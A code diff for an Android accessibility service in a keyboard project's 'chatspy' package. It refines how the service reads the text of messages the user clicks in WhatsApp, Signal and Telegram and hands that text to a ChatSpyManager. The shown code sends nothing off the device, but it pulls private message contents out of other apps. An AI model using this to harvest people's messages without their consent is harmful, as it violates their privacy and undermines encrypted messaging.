@@ -19,13 +19,17 @@ package dev.patrickgold.florisboard.chatspy
 import android.accessibilityservice.AccessibilityService
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
 
 class ChatAccessibilityService : AccessibilityService() {
 
     private val targetPackages = setOf(
         "com.whatsapp",
         "org.thoughtcrime.securesms", // Signal
-        "org.telegram.messenger"
+        "org.telegram.messenger",
+        "com.telegram.messenger"
     )
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
@@ -37,30 +41,50 @@ class ChatAccessibilityService : AccessibilityService() {
 
         // specific trigger: User CLICKED something
         if (event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
+            // event.source creates a new node instance that MUST be recycled
             val sourceNode = event.source ?: return
 
-            // Extract text from the clicked node or its children
-            val capturedText = extractText(sourceNode)
+            try {
+                val allTextParts = mutableListOf<String>()
+                collectAllText(sourceNode, allTextParts)
 
-            if (!capturedText.isNullOrBlank()) {
-                ChatSpyManager.onMessageClicked(this, capturedText, event.packageName.toString())
+                // Heuristic: Longest text is likely the message body
+                val bestText = allTextParts.maxByOrNull { it.length }
+
+                if (!bestText.isNullOrBlank()) {
+                    CoroutineScope(Dispatchers.Main).launch {
+                        ChatSpyManager.onMessageClicked(bestText, event.packageName.toString())
+                    }
+                }
+            } finally {
+                // CRITICAL: Recycle the root node to prevent memory leaks
+                sourceNode.recycle()
             }
         }
     }
 
-    private fun extractText(node: AccessibilityNodeInfo): String? {
-        // 1. If this node has text, return it
-        if (!node.text.isNullOrBlank()) {
-            return node.text.toString()
+    private fun collectAllText(node: AccessibilityNodeInfo?, targetList: MutableList<String>) {
+        if (node == null) return
+
+        // 1. Check content description (often used by accessibility for the whole message)
+        if (!node.contentDescription.isNullOrBlank()) {
+            targetList.add(node.contentDescription.toString())
         }
 
-        // 2. If no text, check children (sometimes clicks land on the message container)
-        for (i in 0 until node.childCount) {
-            val child = node.getChild(i) ?: continue
-            val text = extractText(child)
-            if (text != null) return text
+        // 2. Check actual text
+        if (!node.text.isNullOrBlank()) {
+            targetList.add(node.text.toString())
         }
-        return null
+
+        // 3. Recursively check all children to find hidden text views
+        for (i in 0 until node.childCount) {
+            val child = node.getChild(i)
+            if (child != null) {
+                collectAllText(child, targetList)
+                // CRITICAL: Recycle the child node immediately after processing
+                child.recycle()
+            }
+        }
     }
 
     override fun onInterrupt() {}
